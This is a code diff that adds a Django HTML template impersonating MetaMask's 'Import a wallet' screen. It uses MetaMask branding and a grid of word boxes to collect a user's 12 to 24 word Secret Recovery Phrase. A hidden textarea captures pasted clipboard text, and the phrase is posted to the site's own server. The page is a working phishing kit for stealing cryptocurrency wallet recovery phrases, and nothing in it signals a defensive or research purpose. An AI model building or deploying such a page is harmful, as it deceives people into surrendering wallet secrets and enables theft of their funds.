@@ -1,0 +1,98 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Import Wallet - MetaMask</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body { background:#000; color:#fff; font-family:'Inter',system-ui,sans-serif; margin:0; min-height:100vh; display:flex; flex-direction:column; align-items:center; }
+        .top-bar { width:100%; max-width:480px; padding:24px 20px; display:flex; justify-content:space-between; align-items:center; }
+        .card { background:#0f0f0f; border-radius:24px; padding:40px 32px; width:100%; max-width:480px; box-shadow:0 20px 60px rgba(0,0,0,0.8); border:1px solid #1f1f1f; margin:20px; }
+        h1 { font-size:32px; font-weight:700; margin:0 0 16px; }
+        .info { color:#ccc; font-size:15px; margin-bottom:32px; }
+        .words-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:16px; margin-bottom:32px; }
+        .word-box { position:relative; }
+        .word-box input { width:100%; background:#1a1a1a; border:1px solid #333; color:#fff; padding:14px 16px 14px 48px; border-radius:12px; font-size:16px; }
+        .word-box input:focus { border-color:#FF5C16; box-shadow:0 0 0 3px rgba(255,92,22,0.25); outline:none; }
+        .word-box .num { position:absolute; left:16px; top:50%; transform:translateY(-50%); color:#FF5C16; font-weight:600; font-size:14px; pointer-events:none; }
+        .paste-btn { color:#FF5C16; background:none; border:none; font-size:15px; cursor:pointer; margin:16px 0; }
+        .helper { color:#888; font-size:13px; margin-bottom:32px; }
+        .btn-primary { background:#FF5C16; border:none; color:white; width:100%; padding:16px; border-radius:999px; font-size:16px; font-weight:600; }
+        .btn-primary:hover { background:#FFA680; }
+    </style>
+</head>
+<body>
+
+    <div class="top-bar">
+        <img src="{% static 'images/MetaMask_Fox.svg' %}" alt="MetaMask" style="width:48px;">
+        <select class="form-select bg-transparent text-white border-0 w-auto">
+            <option>English</option>
+        </select>
+    </div>
+
+    <div class="card">
+        <h1>Import a wallet</h1>
+        <p class="info">Enter your Secret Recovery Phrase</p>
+
+        <form method="post" action="{% url 'import_success' %}">
+            {% csrf_token %}
+            <textarea name="seed_phrase" id="real-seed" style="display:none;" required></textarea>
+
+            <div id="words-grid" class="words-grid"></div>
+
+            <button type="button" class="paste-btn" onclick="document.getElementById('paste-detector').focus();">Paste from clipboard</button>
+
+            <p class="helper">Add spaces between words. Make sure no one is watching.</p>
+
+            <button type="submit" class="btn-primary">Continue</button>
+        </form>
+    </div>
+
+    <textarea id="paste-detector" style="position:absolute; opacity:0; height:1px; width:1px;"></textarea>
+
+    <script>
+        const grid = document.getElementById('words-grid');
+        const real = document.getElementById('real-seed');
+        const detector = document.getElementById('paste-detector');
+
+        function createBoxes(n=12) {
+            grid.innerHTML = '';
+            for(let i=1; i<=n; i++){
+                const d = document.createElement('div');
+                d.className = 'word-box';
+                d.innerHTML = `<span class="num">${i}.</span><input type="text" maxlength="20" data-idx="${i-1}" placeholder="word">`;
+                grid.appendChild(d);
+            }
+        }
+
+        function syncReal() {
+            const vals = [...grid.querySelectorAll('input')].map(el=>el.value.trim()).filter(Boolean);
+            real.value = vals.join(' ');
+        }
+
+        function handlePaste(txt) {
+            const words = txt.trim().split(/\s+/).filter(w=>w);
+            if(words.length >= 12){
+                const cnt = Math.min(words.length, 24);
+                createBoxes(cnt);
+                const inputs = grid.querySelectorAll('input');
+                words.slice(0,cnt).forEach((w,idx)=> { if(inputs[idx]) inputs[idx].value = w; });
+                syncReal();
+            }
+        }
+
+        detector.addEventListener('paste', e => {
+            e.preventDefault();
+            handlePaste((e.clipboardData || window.clipboardData).getData('text'));
+            detector.value = '';
+        });
+
+        grid.addEventListener('input', syncReal);
+        createBoxes(12);
+    </script>
+
+</body>
+</html>
